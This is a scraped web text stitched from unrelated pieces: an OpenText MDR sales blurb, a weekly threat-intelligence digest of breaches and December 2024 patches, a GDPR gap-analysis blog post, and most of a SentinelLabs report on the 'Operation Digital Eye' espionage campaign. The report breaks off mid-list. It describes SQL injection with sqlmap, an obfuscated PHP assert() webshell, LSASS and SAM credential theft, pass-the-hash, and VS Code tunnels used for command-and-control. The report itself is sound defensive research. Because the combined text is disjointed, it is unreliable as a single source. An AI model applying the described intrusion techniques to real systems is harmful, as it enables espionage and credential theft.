&lt;p&gt;Managing a customer’s complex environment can be challenging for MSPs. With diverse security tools, large volumes of data, and multi-environment deployments, the complexity of managing each unique environment can overwhelm MSP teams, stretching resources thin and hindering effective security management. Delivering cybersecurity services that support your diverse customer environments requires a solution that integrates seamlessly and simplifies management without adding to the burden.&lt;/p&gt;



&lt;p&gt;OpenText MDR makes it easy to support your customer environments by offering a fully integrated solution that seamlessly supports your MSP partner and tools ecosystem. With AI-driven automation, OpenText MDR processes vast amounts of data quickly, integrating effortlessly with over 500 tools and services. Its lightweight agent ensures easy deployment across multiple environments, providing end-to-end visibility through a single dashboard.

&lt;h2 class="wp-block-heading"&gt;5. Driving revenue growth without barriers to entry&lt;/h2&gt;



&lt;p&gt;For MSPs, staying competitive and standing out in your region requires offering innovative solutions that meet customer needs without the complexity and barriers often associated with new vendor partnerships. Having an MDR offering can be a key driver for growth, but the challenge lies in finding an MDR vendor that has both a cutting-edge solution and flexible licensing, without the constraints of long-term contracts or rigid terms.&lt;br /&gt;OpenText MDR addresses this by offering a subscription-based model with no minimum contract, making it easy to integrate into your existing service offerings. MSPs can access additional services like penetration testing, vulnerability management, and custom incident response plans as needed, with simple, integrated billing through OpenText&amp;#8217;s Secure Cloud Platform. This flexibility allows you to scale your MSPs cybersecurity services as your business grows.&lt;/p&gt;

The threat actor gained access to Byte Federal systems by exploiting a GitLab vulnerability, exposing names, addresses, phone numbers, government-issued IDs, Social Security numbers, transaction activity, and user photos.&lt;/li&gt;
&lt;li&gt;Artivion, an American manufacturer of heart surgery medical devices, has &lt;a href="https://www.infosecurity-magazine.com/news/heart-device-maker-artivion/"&gt;been&lt;/a&gt; a victim of a ransomware attack that occurred in November and forced it to take some systems offline as a precaution. The attack disrupted its delivery and shipping systems by encrypting files, causing operational delays and an expected financial impact. No ransomware gang has taken credit yet.&lt;/li&gt;
&lt;li&gt;Auto parts giant LKQ Corporation has &lt;a href="https://ca.investing.com/news/sec-filings/lkq-corp-reports-cyber-incident-at-canadian-unit-93CH-3752599"&gt;suffered&lt;/a&gt; a cyber-attack that resulted in unauthorized access to its Canadian business unit&amp;#8217;s IT systems, causing operational disruptions for several weeks. The incident may have compromised data of individuals associated with the affected unit. No ransomware gangs or other threat actors have claimed responsibility for the attack.&lt;/li&gt;
&lt;li&gt;Krispy Kreme Doughnut Corporation has &lt;a href="https://www.theregister.com/2024/12/11/krispy_kreme_cybercrime/"&gt;experienced&lt;/a&gt; a cyber-attack that resulted in unauthorized access to its IT systems, causing disruptions to online ordering for customers. The incident is expected to have a material financial impact due to lost digital sales and restoration costs.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;VULNERABILITIES AND PATCHES&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Microsoft’s December 2024 Patch Tuesday &lt;a href="https://msrc.microsoft.com/update-guide/releaseNote/2024-Dec"&gt;addresses&lt;/a&gt; 71 vulnerabilities across 10 product families, including 16 critical issues and one zero-day vulnerability (CVE-2024-49138). This zero-day is a privilege escalation vulnerability within the Microsoft Windows Common Log File System (CLFS) driver. The most affected product is Microsoft Windows with 58 patches, followed by Extended Security Updates (ESU), and Microsoft Office.&lt;/li&gt;
&lt;/ul&gt;
&lt;p style="padding-left: 40px;"&gt;&lt;em&gt;Check Point IPS blade provides protection against this threat &lt;/em&gt;&lt;em&gt;(Microsoft Windows Common Log File System Driver Elevation of Privilege (CVE-2024-49138))&lt;/em&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Google has &lt;a href="https://chromereleases.googleblog.com/2024/12/stable-channel-update-for-desktop_10.html"&gt;released&lt;/a&gt; a security update for Google Chrome, addressing two high severity vulnerabilities, CVE-2024-12381 and CVE-2024-12382. The first flaw is a type confusion vulnerability in the Chrome V8 JavaScript engine and the second is a use after free vulnerability in Chrome’s Translate function. These vulnerabilities could allow unauthorized control over affected systems.&lt;/li&gt;
&lt;li&gt;Apple has &lt;a href="https://support.apple.com/en-us/121837"&gt;published&lt;/a&gt; a security advisory addressing vulnerabilities in its products&amp;#8217; operating systems iOS 18.2 and iPadOS 18.2. The security patch for iOS includes fixes more than 20 security vulnerabilities. One of the flaws, CVE-2024-54526, could result in access to private information.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;THREAT INTELLIGENCE REPORTS&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Check Point Research has &lt;a href="https://blog.checkpoint.com/research/november-2024s-most-wanted-malware-androxgh0st-leads-the-pack-targeting-iot-devices-and-critical-infrastructure/"&gt;released&lt;/a&gt; November 2024’s Most Wanted Malware report, highlighting the rise of Androxgh0st, a Mozi-integrated botnet exploiting vulnerabilities across multiple platforms, including IoT devices and web servers. Among top mobile malware threats, Joker remains most prevalent, followed by Anubis and Necro. Joker steals SMS messages, contacts, and device information while silently subscribing victims to premium services.&lt;/li&gt;
&lt;li&gt;Threat actors &lt;a href="https://www.trendmicro.com/en_us/research/24/l/darkgate-malware.html"&gt;posed&lt;/a&gt; as IT support on Microsoft Teams, tricking employees into installing AnyDesk for remote access. The attackers leveraged registration bombing to flood victims’ inboxes with legitimate spam emails, sowing confusion and prompting them to seek help. After gaining access, they deployed multiple malicious files, including the DARKGATE malware.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The post &lt;a href="https://www.itgovernance.co.uk/blog/how-a-gdpr-gap-analysis-helps-secure-support-from-senior-management"&gt;How a GDPR Gap Analysis Helps Secure Support From Senior Management&lt;/a&gt; appeared first on &lt;a href="https://www.itgovernance.co.uk/blog"&gt;IT Governance UK Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;h2 class="wp-block-heading"&gt;GDPR gap analysis data shows compliance in the UK is “quite low”&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;When implementing a &lt;/strong&gt;&lt;a href="https://www.itgovernance.co.uk/data-protection-dpa-and-eu-data-protection-regulation" rel="noreferrer noopener" target="_blank"&gt;&lt;strong&gt;GDPR (General Data Protection Regulation)&lt;/strong&gt;&lt;/a&gt;&lt;strong&gt; compliance programme, a key challenge is securing the required resources and support – particularly from top management.&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Yet GDPR compliance brings business benefits beyond mitigating the risk of data breaches and &lt;a href="https://www.itgovernance.co.uk/dpa-and-gdpr-penalties" rel="noreferrer noopener" target="_blank"&gt;fines&lt;/a&gt;:&lt;/p&gt;



&lt;ul class="wp-block-list li-spaced"&gt;
&lt;li&gt;You’ll stop duplicating work, improving productivity.&lt;/li&gt;



&lt;li&gt;You can better tie down the requirements for RBAC (role-based &lt;a href="https://www.itgovernance.co.uk/blog/what-is-access-control" rel="noreferrer noopener" target="_blank"&gt;access control&lt;/a&gt;).&lt;/li&gt;



&lt;li&gt;You can clearly define roles and responsibilities in job descriptions and other documentation.&lt;/li&gt;



&lt;li&gt;Your information will be more organised, so you can find what you need quicker, and with greater confidence in its accuracy.&lt;/li&gt;



&lt;li&gt;You’ll get rid of data you don’t need, in line with your retention policy. That saves storage space and costs, and gives you more accurate insights into your data.&lt;/li&gt;
&lt;/ul&gt;







&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading"&gt;The value of a gap analysis&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;But how can you get management to understand these benefits, and more to the point, understand how far away the organisation is from compliance?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;&lt;a href="https://www.itgovernance.co.uk/shop/product/gdpr-gap-analysis" rel="noreferrer noopener" target="_blank"&gt;GDPR gap analysis&lt;/a&gt; offers a useful tool here – particularly if conducted by an independent third party.&lt;/p&gt;



&lt;p&gt;A gap analysis (or ‘gap assessment’) compares an organisation’s current measures against an ideal ‘target state’ – in this case, GDPR compliance.&lt;/p&gt;



&lt;p&gt;Gap analyses typically produce a report following the assessment, often with a prioritised action plan, that can function as a ‘reality check’ to management. It can help support your case to the board for needing extra resources.&lt;/p&gt;

&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading"&gt;GDPR compliance in the UK: “quite low”&lt;/h2&gt;



&lt;p&gt;DQM GRC’s &lt;a href="https://www.dqmgrc.com/resources/gdpr-benchmark-report" rel="noreferrer noopener" target="_blank"&gt;GDPR Benchmark Report 2024&lt;/a&gt; – based on gap analysis data – shows that &lt;strong&gt;many UK organisations have significant room for improvement when it comes to GDPR compliance&lt;/strong&gt;.&lt;/p&gt;



&lt;p&gt;The average score was 5.3, which DQM GRC described as “quite low”.&lt;/p&gt;



&lt;p&gt;That said, the report also found that, on average, organisations performed better in certain GDPR compliance areas over others.&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;h3 class="wp-block-heading"&gt;Privacy by design&lt;/h3&gt;



&lt;p&gt;For instance, the report found that privacy by design is the weakest compliance area.&lt;/p&gt;



&lt;p&gt;This may be because organisations are less likely to treat privacy risks as business risks – yet privacy by design improves business projects, because they make for simpler, more user-friendly software (or more customer-friendly products and services).&lt;/p&gt;



&lt;p&gt;When you think about what data should be available to each process, you both improve your level of data security &lt;em&gt;and&lt;/em&gt; force designers to take the time to consider what the process needs to do and why.&lt;/p&gt;



&lt;p&gt;&lt;em&gt;(This is also key to &lt;/em&gt;&lt;a href="https://www.itgovernance.co.uk/blog/how-to-select-effective-security-controls" rel="noreferrer noopener" target="_blank"&gt;&lt;em&gt;effective control selection&lt;/em&gt;&lt;/a&gt;&lt;em&gt; in information security.)&lt;/em&gt;&lt;/p&gt;



&lt;p&gt;Privacy by design also brings less conspicuous benefits:&lt;/p&gt;



&lt;ul class="wp-block-list li-spaced"&gt;
&lt;li&gt;It requires &lt;a href="https://www.itgovernance.co.uk/shop/product/gdpr-documentation-toolkit" rel="noreferrer noopener" target="_blank"&gt;better documentation&lt;/a&gt;, which makes your projects easier to manage and, when you need it, will make &lt;a href="https://www.itgovernance.co.uk/bc-dr" rel="noreferrer noopener" target="_blank"&gt;disaster recovery&lt;/a&gt; easier.&lt;/li&gt;



&lt;li&gt;Because you’ll need to look further ahead as you plan your project, it helps create more efficient processes and systems.&lt;/li&gt;



&lt;li&gt;It also ensures you keep your data in appropriate formats ready for future use, and prevents you from using personal data in ways you shouldn’t.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;In short, privacy by design is something you &lt;em&gt;should&lt;/em&gt; be doing, irrespective of any legal requirements.&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;h3 class="wp-block-heading"&gt;Information security&lt;/h3&gt;



&lt;p&gt;Meanwhile, the &lt;a href="https://www.dqmgrc.com/resources/gdpr-benchmark-report" rel="noreferrer noopener" target="_blank"&gt;GDPR Benchmark Report 2024&lt;/a&gt; found that organisations perform better on information security (compliance area ‘ISMS’ – information security management system).&lt;/p&gt;



&lt;p&gt;DQM GRC suggested this is due to information and cyber security issues being more prone to receiving negative press than data protection issues, so organisations are more likely to treat cyber security risks as business risks.&lt;/p&gt;



&lt;p&gt;Damian Garcia, our head of GRC (governance, risk and compliance) consultancy, added:&lt;/p&gt;



&lt;blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow"&gt;
&lt;p&gt;&lt;em&gt;Another possibility for this finding is that prior to 2018 [when the GDPR was enforced], organisations – particularly smaller businesses – may have struggled to justify expenditure on security.&lt;/em&gt;&lt;/p&gt;



&lt;p&gt;&lt;em&gt;In part, this was due to their attitude, often along the lines of: “Who would want to steal our data? It isn’t worth anything.”&lt;/em&gt;&lt;/p&gt;



&lt;p&gt;&lt;em&gt;In other words, business owners struggled to attribute a value to their data.&lt;/em&gt;&lt;/p&gt;



&lt;p&gt;&lt;em&gt;But when the GDPR was introduced, organisations could more easily place a value on the personal data they were holding: the greater of €20 million [now £17.5 million under the UK GDPR] or 4% of annual global turnover.&lt;/em&gt;&lt;/p&gt;



&lt;p&gt;&lt;em&gt;This may have helped convince management for the need to invest in security controls, and perhaps even implement an &lt;/em&gt;&lt;a href="https://www.itgovernance.co.uk/iso27001" rel="noreferrer noopener" target="_blank"&gt;&lt;em&gt;ISO 27001&lt;/em&gt;&lt;/a&gt;&lt;em&gt;-compliant ISMS.&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
&lt;li&gt;From late June to mid-July 2024, a suspected China-nexus threat actor targeted large business-to-business IT service providers in Southern Europe, an activity cluster that we dubbed ‘Operation Digital Eye’.&lt;/li&gt;
&lt;li&gt;The intrusions could have enabled the adversaries to establish strategic footholds and compromise downstream entities. SentinelLabs and Tinexta Cyber detected and interrupted the activities in their initial phases.&lt;/li&gt;
&lt;li&gt;The threat actors used a lateral movement capability indicative of the presence of a shared vendor or digital quartermaster maintaining and provisioning tooling within the Chinese APT ecosystem.&lt;/li&gt;
&lt;li&gt;The threat actors abused Visual Studio Code and Microsoft Azure infrastructure for C2 purposes, attempting to evade detection by making malicious activities appear legitimate.&lt;/li&gt;
&lt;li&gt;Our visibility suggests that the abuse of Visual Studio Code for C2 purposes had been relatively rare in the wild prior to this campaign. Operation Digital Eye marks the first instance of a suspected Chinese APT group using this technique that we have directly observed.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Overview&lt;/h2&gt;
&lt;p&gt;Tinexta Cyber and SentinelLabs have been tracking threat activities targeting business-to-business IT service providers in Southern Europe. Based on the malware, infrastructure, techniques used, victimology, and the timing of the activities, we assess that it is highly likely these attacks were conducted by a China-nexus threat actor with cyberespionage motivations.&lt;/p&gt;
&lt;p&gt;The relationships between European countries and China are complex, characterized by cooperation, competition, and underlying tensions in areas such as trade, investment, and technology. Suspected China-linked cyberespionage groups &lt;a href="https://cert.europa.eu/static/files/TLP-CLEAR-JointPublication-23-01.pdf" rel="noopener noreferrer" target="_blank"&gt;frequently&lt;/a&gt; &lt;a href="https://cert.europa.eu/publications/threat-intelligence/cb24-08/" rel="noopener noreferrer" target="_blank"&gt;target&lt;/a&gt; public and private organizations across Europe to gather strategic intelligence, gain competitive advantages, and advance geopolitical, economic, and technological interests.&lt;/p&gt;
&lt;p&gt;The attack campaign, which we have dubbed Operation Digital Eye, took place from late June to mid-July 2024, lasting approximately three weeks. The targeted organizations provide solutions for managing data, infrastructure, and cybersecurity for clients across various industries, making them prime targets for cyberespionage actors.&lt;/p&gt;
&lt;p&gt;A sustained presence within these organizations would provide the Operation Digital Eye actors with a strategic foothold, creating opportunities for intrusions across the digital supply chain and enabling them to exert control over critical IT processes within the downstream compromised entities. The attacks were detected and disrupted during their initial phases.&lt;/p&gt;
&lt;p&gt;The exact group behind Operation Digital Eye remains unclear due to the extensive &lt;a href="https://www.sentinelone.com/labs/chinese-entanglement-dll-hijacking-in-the-asian-gambling-sector/" rel="noopener noreferrer" target="_blank"&gt;sharing&lt;/a&gt; of malware, operational playbooks, and infrastructure management processes within the Chinese threat landscape. The threat actors used a pass-the-hash capability, likely originating from the same source as closed-source custom Mimikatz modifications observed exclusively in suspected Chinese cyberespionage activities, such as &lt;a href="https://www.cybereason.com/blog/research/operation-soft-cell-a-worldwide-campaign-against-telecommunications-providers" rel="noopener noreferrer" target="_blank"&gt;Operation Soft Cell&lt;/a&gt; and &lt;a href="https://www.sentinelone.com/labs/operation-tainted-love-chinese-apts-target-telcos-in-new-attacks/" rel="noopener noreferrer" target="_blank"&gt;Operation Tainted Love&lt;/a&gt;. The malware and tooling used in these campaigns have been &lt;a href="https://github.com/yt0ng/cracking_softcell/blob/main/Cracking_SOFTCLL_TLP_WHITE.pdf" rel="noopener noreferrer" target="_blank"&gt;linked &lt;/a&gt;to several distinct Chinese APT groups. We collectively refer to these custom Mimikatz modifications as mimCN.&lt;/p&gt;
&lt;p&gt;The long-term evolution and versioning of mimCN samples, along with notable features such as instructions left for a separate team of operators, suggest the involvement of a shared vendor or digital quartermaster responsible for the active maintenance and provisioning of tooling. This function within the Chinese APT ecosystem, corroborated by the &lt;a href="https://www.sentinelone.com/labs/unmasking-i-soon-the-leak-that-revealed-chinas-cyber-operations/" rel="noopener noreferrer" target="_blank"&gt;I-Soon leak&lt;/a&gt;, likely plays a key role in facilitating China-nexus cyberespionage operations.&lt;/p&gt;
&lt;p&gt;The abuse of &lt;a href="https://code.visualstudio.com/" rel="noopener noreferrer" target="_blank"&gt;Visual Studio Code&lt;/a&gt; &lt;a href="https://code.visualstudio.com/docs/remote/tunnels" rel="noopener noreferrer" target="_blank"&gt;Remote Tunnels&lt;/a&gt; for C2 purposes is central to this campaign. Originally designed to enable remote development, this technology provides full endpoint access, including command execution and filesystem manipulation. Additionally, Visual Studio Code tunneling involves executables signed by Microsoft and Microsoft Azure network infrastructure, both of which are often not closely monitored and are typically allowed by application controls and firewall rules. As a result, this technique may be challenging to detect and could evade security defenses. Combined with the full endpoint access it provides, this makes Visual Studio Code tunneling an attractive and powerful capability for threat actors to exploit.&lt;/p&gt;
&lt;p&gt;Tinexta Cyber and SentinelLabs have notified Microsoft about the abuse of Visual Studio Code and Azure infrastructure in connection with Operation Digital Eye.&lt;/p&gt;
&lt;h2&gt;Infection Vector and Attack Progression&lt;/h2&gt;
&lt;p&gt;The attackers used SQL (Structured Query Language) injection as an initial access vector to infiltrate Internet-facing web and database servers. &lt;code&gt;User-Agent&lt;/code&gt; request headers in the web traffic logs we retrieved indicate that the attackers used the &lt;a href="https://sqlmap.org/" rel="noopener noreferrer" target="_blank"&gt;sqlmap&lt;/a&gt; tool to automate the detection and exploitation of SQL injection vulnerabilities.&lt;/p&gt;
&lt;p&gt;To establish an initial foothold and maintain persistent access, the threat actors deployed a PHP-based webshell. Relatively simple in design and implementation, the webshell uses the &lt;a href="https://www.php.net/manual/en/function.assert.php" rel="noopener noreferrer" target="_blank"&gt;assert&lt;/a&gt; function to execute attacker-provided PHP code. Its implementation does not resemble any other webshells we are familiar with. We track this webshell under the name PHPsert.&lt;/p&gt;
&lt;p&gt;To disguise the files implementing PHPsert and attempt to evade detection based on filesystem activity, the attackers used custom names tailored to the infiltrated environments, making the filenames appear legitimate. This included using the local language and terms that aligned with the technological context of the targeted organizations.&lt;/p&gt;
&lt;p&gt;After establishing an initial foothold, the threat actors conducted reconnaissance using a variety of third-party tools and built-in Windows utilities, such as &lt;a href="https://joeware.net/freetools/tools/getuserinfo/index.htm" rel="noopener noreferrer" target="_blank"&gt;GetUserInfo&lt;/a&gt; and &lt;code&gt;ping&lt;/code&gt;. They also deployed the &lt;code&gt;local.exe&lt;/code&gt; tool, which is part of the Microsoft Windows NT Resource Kit and allows for viewing user group memberships.&lt;/p&gt;
&lt;p&gt;To steal credentials, the attackers used the &lt;code&gt;CreateDump&lt;/code&gt; tool to &lt;a href="https://lolbas-project.github.io/lolbas/OtherMSBinaries/Createdump/" rel="noopener noreferrer" target="_blank"&gt;extract&lt;/a&gt; memory allocated to the Local Security Authority Subsystem Service (LSASS) process and exfiltrate credentials. &lt;code&gt;CreateDump&lt;/code&gt; is part of the Microsoft .NET Framework distribution. The threat actors also retrieved credentials from the Security Account Manager (SAM) database, which they extracted from the Windows Registry using the &lt;code&gt;reg save&lt;/code&gt; &lt;a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg-save" rel="noopener noreferrer" target="_blank"&gt;command&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The threat actors frequently named the files they deployed using the pattern &lt;code&gt;do.*&lt;/code&gt;. Examples include &lt;code&gt;do.log&lt;/code&gt; (output from &lt;code&gt;ping&lt;/code&gt; commands), &lt;code&gt;do.exe&lt;/code&gt; (the &lt;code&gt;CreateDump&lt;/code&gt; tool), and &lt;code&gt;do.bat&lt;/code&gt; (a script that executes and deletes the &lt;code&gt;CreateDump&lt;/code&gt; executable).&lt;/p&gt;
&lt;p&gt;From the initially compromised endpoints, the attackers moved laterally across the internal network, primarily using RDP (Remote Desktop Protocol) connections and pass-the-hash techniques. For the pass-the-hash attacks, they used a custom modified version of Mimikatz, implemented in an executable named &lt;code&gt;bK2o.exe&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;In addition to the PHPsert webshell, the threat actors used two methods for remote command execution: SSH access, enabled by deploying &lt;code&gt;authorized_keys&lt;/code&gt; files containing public keys for authentication, and Visual Studio Code Remote Tunnels.&lt;/p&gt;
&lt;p&gt;Visual Studio Code Remote Tunnels, based on Microsoft’s &lt;a href="https://learn.microsoft.com/en-us/azure/developer/dev-tunnels/overview" rel="noopener noreferrer" target="_blank"&gt;dev tunnel&lt;/a&gt; technology, enable developers to access and work on remote systems. This access includes the command terminal and file system, allowing activities such as command execution and file editing. The Operation Digital Eye actors abused this functionality to maintain persistent backdoor access to compromised systems.&lt;/p&gt;
&lt;p&gt;In an attempt to evade detection based on filesystem activity, the threat actors used &lt;code&gt;%SystemRoot%\Temp&lt;/code&gt; and &lt;code&gt;%ProgramData%\Visual Studio Code&lt;/code&gt; as their primary working directories for storing tools and data. &lt;code&gt;%SystemRoot%\Temp&lt;/code&gt; is a directory where Windows stores temporary files and is often monitored with less scrutiny. &lt;code&gt;%ProgramData%\Visual Studio Code&lt;/code&gt; was intended to appear as a legitimate directory associated with Visual Studio Code.&lt;/p&gt;
&lt;p&gt;The intrusions were detected and interrupted before the attackers could proceed to further phases, such as exfiltrating data.&lt;/p&gt;
&lt;h2&gt;Abuse of Visual Studio Code&lt;/h2&gt;
&lt;p&gt;The threat actors deployed a portable Visual Studio Code executable named &lt;code&gt;code.exe&lt;/code&gt;, which is digitally signed by Microsoft, and used the &lt;a href="https://github.com/winsw/winsw" rel="noopener noreferrer" target="_blank"&gt;winsw&lt;/a&gt; tool to run it as a Windows service. The &lt;code&gt;winsw&lt;/code&gt; configuration file we retrieved indicates that the attackers created a service named &lt;code&gt;Visual Studio Code Service&lt;/code&gt;, which executes &lt;code&gt;code.exe&lt;/code&gt; with the &lt;code&gt;tunnel&lt;/code&gt; command-line parameter at every system startup.&lt;/p&gt;
&lt;p&gt;The configuration file reveals a pragmatic approach by the threat actors, who likely modified a &lt;a href="https://github.com/winsw/winsw/blob/v3/samples/complete.xml" rel="noopener noreferrer" target="_blank"&gt;publicly available&lt;/a&gt; &lt;code&gt;winsw&lt;/code&gt; configuration. This is suggested by the use of the &lt;code&gt;myapp&lt;/code&gt; service identifier and the &lt;code&gt;%BASE%\logs&lt;/code&gt; directory for storing &lt;code&gt;winsw&lt;/code&gt; log files, both of which appear in the public configuration file as well as in the one we retrieved.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109546" style="width: 852px;"&gt;&lt;img alt="winsw configuration file" class="size-full wp-image-109546" height="396" src="https://www.sentinelone.com/wp-content/uploads/2024/11/Op_Digital_Eye13.jpg" width="852" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109546"&gt;winsw configuration file&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;The &lt;code&gt;tunnel&lt;/code&gt; parameter instructs Visual Studio Code to create a dev tunnel and act as a server to which remote users can connect. After &lt;a href="https://learn.microsoft.com/en-us/azure/developer/dev-tunnels/security" rel="noopener noreferrer" target="_blank"&gt;authenticating&lt;/a&gt; to the tunnel with a Microsoft or GitHub account, remote users can access the endpoint running the Visual Studio Code server, either through the Visual Studio Code desktop application or the browser-based version, &lt;a href="https://vscode.dev/" rel="noopener noreferrer" target="_blank"&gt;vscode.dev&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;After creating the dev tunnels, the threat actors authenticated using GitHub accounts and accessed the compromised endpoints through the browser-based version of Visual Studio Code. We have no knowledge of whether the threat actors used self-registered or compromised GitHub accounts to authenticate to the tunnels.&lt;/p&gt;
&lt;h2&gt;Network Infrastructure&lt;/h2&gt;
&lt;p&gt;The Operation Digital Eye actors used infrastructure located exclusively within Europe, sourced from the provider M247 and the Cloud platform Microsoft Azure. This was likely part of a deliberate strategy. Since the targeted organizations are based and operate within Europe, the attackers may have aimed to minimize suspicion by aligning their infrastructure&amp;#8217;s location with that of their targets. Additionally, Cloud infrastructure commonly used in legitimate IT workflows, such as Microsoft Azure, is often not closely monitored and is frequently allowed through firewall restrictions. By leveraging public Cloud infrastructure for malicious purposes, the attackers made the traffic appear legitimate, which can be challenging to detect and may evade security defenses.&lt;/p&gt;
&lt;p&gt;In the initial phases of the attacks, the threat actors used the server with IP address &lt;code&gt;146.70.161[.]78&lt;/code&gt; to establish initial access by detecting and exploiting SQL injection vulnerabilities, and the server with IP address &lt;code&gt;185.76.78[.]117&lt;/code&gt; to operate the PHPsert webshell. Both IP addresses are allocated to the infrastructure provider M247 and are located in Poland and Italy, respectively.&lt;/p&gt;
&lt;p&gt;In the later phases of the attacks, the threat actors used the server with IP address &lt;code&gt;4.232.170[.]137&lt;/code&gt; for C2 purposes when remotely accessing compromised endpoints via the SSH protocol. This server is part of Microsoft&amp;#8217;s Azure infrastructure in the &lt;code&gt;Italy North&lt;/code&gt; &lt;a href="https://learn.microsoft.com/en-us/azure/virtual-machines/regions" rel="noopener noreferrer" target="_blank"&gt;datacenter region&lt;/a&gt; (&lt;a href="https://www.microsoft.com/en-us/download/details.aspx?id=56519" rel="noopener noreferrer" target="_blank"&gt;Azure IP range&lt;/a&gt;: &lt;code&gt;4.232.128[.]0/18&lt;/code&gt;, &lt;a href="https://learn.microsoft.com/en-us/azure/virtual-network/service-tags-overview" rel="noopener noreferrer" target="_blank"&gt;service tag&lt;/a&gt;: &lt;code&gt;AzureCloud.italynorth&lt;/code&gt;). We currently have no information on whether the threat actors used self-registered or compromised Azure credentials to access and manage the Azure resources and services.&lt;/p&gt;
&lt;p&gt;The abuse of Visual Studio Code tunneling for C2 purposes also relies on Microsoft Azure infrastructure. Creating and hosting a dev tunnel requires connecting to a Microsoft Azure server with a domain of &lt;code&gt;*.[clusterID].devtunnels.ms&lt;/code&gt;, where &lt;code&gt;[clusterID]&lt;/code&gt; corresponds to the Azure region of the endpoint running the Visual Studio Code server, &lt;a href="https://global.rel.tunnels.api.visualstudio.com/api/v1/clusters" rel="noopener noreferrer" target="_blank"&gt;such as&lt;/a&gt; &lt;code&gt;euw&lt;/code&gt; for &lt;code&gt;West Europe&lt;/code&gt;. In Operation Digital Eye, the creation of dev tunnels involved establishing connections to the server with the domain &lt;code&gt;[REDACTED].euw.devtunnels[.]ms&lt;/code&gt;, which resolved to the IP address &lt;code&gt;20.103.221[.]187&lt;/code&gt;. This server is part of Microsoft&amp;#8217;s Azure infrastructure in the &lt;code&gt;West Europe&lt;/code&gt; datacenter region (Azure IP range: &lt;code&gt;20.103.0[.]0/16&lt;/code&gt;, service tag: &lt;code&gt;AzureCloud.westeurope&lt;/code&gt;).&lt;/p&gt;
&lt;h2&gt;The PHPsert Webshell&lt;/h2&gt;
&lt;p&gt;PHPsert executes attacker-provided PHP code using the &lt;a href="https://www.php.net/manual/en/function.assert.php" rel="noopener noreferrer" target="_blank"&gt;assert&lt;/a&gt; function, which, in PHP versions prior to 8.0.0, interprets and runs parameter strings as PHP code. To hinder static analysis and evade detection, the webshell uses various code obfuscation techniques, including XOR encoding, hexadecimal character representation, string concatenation, and randomized variable names.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109540" style="width: 664px;"&gt;&lt;img alt="PHPsert implementation" class="size-full wp-image-109540" height="434" src="https://www.sentinelone.com/wp-content/uploads/2024/11/Op_Digital_Eye3.jpg" width="664" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109540"&gt;PHPsert implementation&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;The PHPsert webshell operates as follows:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;PHPsert instantiates a class with a single regular method, which XOR-decodes and concatenates hexadecimal characters to generate the string &lt;code&gt;assert&lt;/code&gt;. The class&amp;#8217;s destructor (the magic method &lt;code&gt;__destruct&lt;/code&gt;) uses this string to invoke the &lt;code&gt;assert&lt;/code&gt; function, passing attacker-provided PHP code as a parameter.&lt;/li&gt;
&lt;li&gt;The webshell retrieves the attacker-provided PHP code from an HTTP POST request parameter, for example, &lt;code&gt;momomomo&lt;/code&gt;. If the &lt;code&gt;id&lt;/code&gt; parameter is present in the request URL, PHPsert decodes the Base64-encoded value of the POST parameter. If the &lt;code&gt;id&lt;/code&gt; parameter is absent, the webshell uses the raw value of the parameter.&lt;/li&gt;
&lt;li&gt;Finally, when PHPsert finishes executing, the class&amp;#8217;s destructor is invoked, which in turn calls the &lt;code&gt;assert&lt;/code&gt; function to execute the attacker-provided PHP code.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;We identified multiple PHPsert variants, which have been submitted to malware sharing platforms since May 2023, from various locations including Japan, Singapore, Peru, Taiwan, Iran, Korea, and the Philippines. These variants show only minor differences in their implementation, such as varying variable names and POST request parameters like &lt;code&gt;mr6&lt;/code&gt;, &lt;code&gt;brute&lt;/code&gt;, and &lt;code&gt;qq&lt;/code&gt;. Our analysis suggests that PHPsert is deployed not only as a standalone PHP file but is also integrated into various types of web content, including web text editors and content management systems.&lt;/p&gt;
&lt;p&gt;One of the PHPsert variants contains commented-out code snippets and comments in simplified Chinese that describe nearby code. These comments and snippets are not present in the PHPsert versions observed in Operation Digital Eye, nor in any of the webshell’s other variants. Below are the code comments, all of which are machine-translated from simplified Chinese:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;结果是"assert"&lt;/code&gt;, which translates to &lt;code&gt;The result is "assert"&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;验证 $this-&gt;rg 是否安全&lt;/code&gt;, which translates to &lt;code&gt;Verify that $this-&gt;rg is safe&lt;/code&gt;.&lt;/li&gt;
